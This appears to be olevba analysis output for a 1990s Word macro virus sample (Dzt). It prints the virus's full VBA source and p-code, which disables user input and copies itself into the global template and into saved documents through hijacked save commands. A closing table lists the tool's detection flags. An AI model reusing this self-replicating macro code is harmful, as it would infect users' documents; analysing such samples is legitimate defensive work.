olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dzt.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dzt.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Dzt.i - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim formatfile, salah
Dim Filebaru$, Cek$

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
formatfile = 0
salah = 0
Filebaru$ = ""
Cek$ = ""
NoAuto
On Error GoTo -1: On Error GoTo finish
Cek$ = WordBasic.[FileNameFromWindow$]()
If WordBasic.IsMacro() Then
    WordBasic.FileSave
    GoTo finish
End If
ulang:
SaveTo
If salah = 1059 Then
    Cek$ = ""
    GoTo ulang
End If
finish:
If Err.Number = 509 Then PrintDisable
End Sub

Private Sub NoAuto()
On Error GoTo -1: On Error GoTo finish
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
finish:
End Sub

Private Sub SaveTo()
On Error GoTo -1: On Error GoTo finish
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If Cek$ = "" Then WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
formatfile = dlg.Format
Filebaru$ = WordBasic.[FileName$]()
If formatfile = 1 Then CopyToFile
If salah = 0 Then
    If formatfile = 1 Then Aksi
    WordBasic.FileSaveAs dlg
End If
finish:
salah = Err.Number
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyFSAF
End If
If salah <> 0 Then
    CopyFSG
    CopyFSAG End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSave", Filebaru$ + ":AutoOpen", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyFSG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyFSAG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":FileSaveAs", "Global:FileSaveAs", 1
finish:
End Sub

Private Sub CopyFSAF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSaveAs", Filebaru$ + ":FileSaveAs", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT"
WordBasic.SetDocumentVar "Dzutaqshiri", "(c)Hikmat Sudrajat, Bandung, April 1996"
finish:
End Sub

Private Sub PrintDisable()
On Error GoTo -1: On Error GoTo finish
WordBasic.PrintStatusBar "This command is not available because a document window is not active"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Dzt.i - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Dzt.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 5436 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn formatfile
' 	VarDefn salah
' Line #2:
' 	Dim 
' 	VarDefn Filebaru
' 	VarDefn Cek
' Line #3:
' Line #4:
' 	FuncDefn (Public Sub MAIN())
' Line #5:
' 	LitDI2 0x0000 
' 	St formatfile 
' Line #6:
' 	LitDI2 0x0000 
' 	St salah 
' Line #7:
' 	LitStr 0x0000 ""
' 	St Filebaru$ 
' Line #8:
' 	LitStr 0x0000 ""
' 	St Cek$ 
' Line #9:
' 	ArgsCall NoAuto 0x0000 
' Line #10:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	St Cek$ 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0000 
' 	IfBlock 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #14:
' 	GoTo finish 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Label ulang 
' Line #17:
' 	ArgsCall SaveTo 0x0000 
' Line #18:
' 	Ld salah 
' 	LitDI2 0x0423 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitStr 0x0000 ""
' 	St Cek$ 
' Line #20:
' 	GoTo ulang 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Label finish 
' Line #23:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x01FD 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall PrintDisable 0x0000 
' 	EndIf 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Private Sub NoAuto())
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #28:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #29:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #30:
' 	Label finish 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub SaveTo())
' Line #34:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #35:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #36:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #37:
' 	Ld Cek$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	EndIf 
' Line #38:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #39:
' 	Ld dlg 
' 	MemLd Format$ 
' 	St formatfile 
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St Filebaru$ 
' Line #41:
' 	Ld formatfile 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CopyToFile 0x0000 
' 	EndIf 
' Line #42:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld formatfile 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Aksi 0x0000 
' 	EndIf 
' Line #44:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label finish 
' Line #47:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub CopyToFile())
' Line #51:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #52:
' 	ArgsCall CekCopyToFile 0x0000 
' Line #53:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #54:
' 	ArgsCall CopyFSAF 0x0000 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #57:
' 	ArgsCall CopyFSG 0x0000 
' Line #58:
' 	Reparse 0x0013 "    CopyFSAG End If"
' Line #59:
' 	Label finish 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Private Sub CekCopyToFile())
' Line #63:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError fin 
' Line #64:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld Filebaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #65:
' 	Label fin 
' Line #66:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Private Sub CopyFSG())
' Line #70:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #71:
' 	Ld Filebaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #72:
' 	Label finish 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Private Sub CopyFSAG())
' Line #76:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #77:
' 	Ld Filebaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #78:
' 	Label finish 
' Line #79:
' 	EndSub 
' Line #80:
' Line #81:
' 	FuncDefn (Private Sub CopyFSAF())
' Line #82:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #83:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld Filebaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #84:
' 	Label finish 
' Line #85:
' 	EndSub 
' Line #86:
' Line #87:
' 	FuncDefn (Private Sub Aksi())
' Line #88:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #89:
' 	LitStr 0x0003 "DZT"
' 	ParamNamed Comments 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #90:
' 	LitStr 0x000B "Dzutaqshiri"
' 	LitStr 0x0027 "(c)Hikmat Sudrajat, Bandung, April 1996"
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #91:
' 	Label finish 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Private Sub PrintDisable())
' Line #95:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #96:
' 	LitStr 0x0045 "This command is not available because a document window is not active"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #97:
' 	Label finish 
' Line #98:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

